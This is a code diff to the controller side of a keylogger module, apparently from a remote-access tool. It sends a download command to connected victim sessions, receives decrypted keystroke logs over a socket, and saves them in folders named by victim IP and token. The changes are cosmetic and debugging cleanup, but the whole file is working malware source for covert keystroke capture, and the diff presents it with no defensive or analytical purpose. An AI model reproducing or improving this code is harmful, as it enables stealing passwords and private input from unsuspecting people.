@@ -43,7 +43,7 @@ class Keylogger:
 
 --dump : displays the file in which the keylogger stores the keyboard keys.
 
---download : Download the file that contains the keyboard keys.
+--download : Download the file that contains the keyboard keystrokes.
 
 -b or --back : Back to menu.
 """) 
@@ -90,8 +90,6 @@ class Keylogger:
     
     def sendMod(self, data):
         if(CheckConn().sendsafe(self.session_nb , Handler.dict_conn[self.session_nb][NB_SOCKET], data)):
-            #CheckConn().recvcommand(Handler.dict_conn[self.session_nb][NB_SOCKET],4096)
-            printColor("successfully", "\n[+] The mod has been sent.")
             CheckConn().recvmod(Handler.dict_conn[self.session_nb][NB_SOCKET])
 
         else:
@@ -113,7 +111,7 @@ class Keylogger:
         
         CheckConn().sendsafe(self.session_nb , Handler.dict_conn[self.session_nb][NB_SOCKET], "MOD_KEYLOGGER:download")
 
-        buffer = 2048 #2048
+        buffer = 4096 #2048
         token = Handler.dict_conn[self.session_nb][NB_TOKEN] 
         ip_str = Handler.dict_conn[self.session_nb][NB_IP]
         now = datetime.now()
@@ -125,33 +123,28 @@ class Keylogger:
         else:
             folder = str(os.getcwd()) + "\\" + "keylogger\\" + str(ip_str)+ "-" + str(token)  
             name_of_file =  folder +"\\" + now.strftime("%b-%m-%Y_%H:%M") +".txt" #Sep-16-2019_14:55.txt
-        print("name of file: ", name_of_file)
+        print("file name create: ", name_of_file)
 
         #try to create the file.
         try:
             os.mkdir(folder)
         except FileExistsError:
-            print("FileExistsError")
             pass
         except Exception as e:
             printColor("error","[-] Unable to create the folder to store log files.")
             return False    
 
-        print("go to write")
         parameter = "w+b" #Write - will overwrite any existing content
         try:
             file = open(name_of_file, parameter)
-        
         except Exception as e:
             printColor("error","[-] impossible to create the file.")
-            print("2")
+        
         else:
-            print("file create..")
-            
+            #print("file create..")
             if not (CheckConn().recvmod(Handler.dict_conn[self.session_nb][NB_SOCKET])):
                 #if error
-                print("la ?")
-                pass
+                printColor("error","[-] An error occurred while sending the mode to the client.")
             else:
                 #if not error
                 printColor("information", "[?] The file is currently downloading...")
@@ -172,18 +165,15 @@ class Keylogger:
                         printColor("error","[-] The timeout was exceeded. \n")
                     else:
                         #write data decrypt in file.
-                        if(data_decrypt.decode("utf8")== "\r\n"):
-                            print("find")
+                        if(data_decrypt.decode("utf8")== "\r\n"): #end connexion
                             break
                         try:
-                            #print("write file")
-                            #print("--->",data_decrypt,"<----")
                             file.write(data_decrypt)
                         except Exception as e:
                             printColor("error",e)
                             break
 
-                printColor("successfully","[+] The file was successfully uploaded to the folder: "+ name_of_file)
+                printColor("successfully","[+] The file was successfully uploaded to the folder: "+ name_of_file+"\n")
                 Handler.dict_conn[self.session_nb][NB_SOCKET].settimeout(None)
 
 
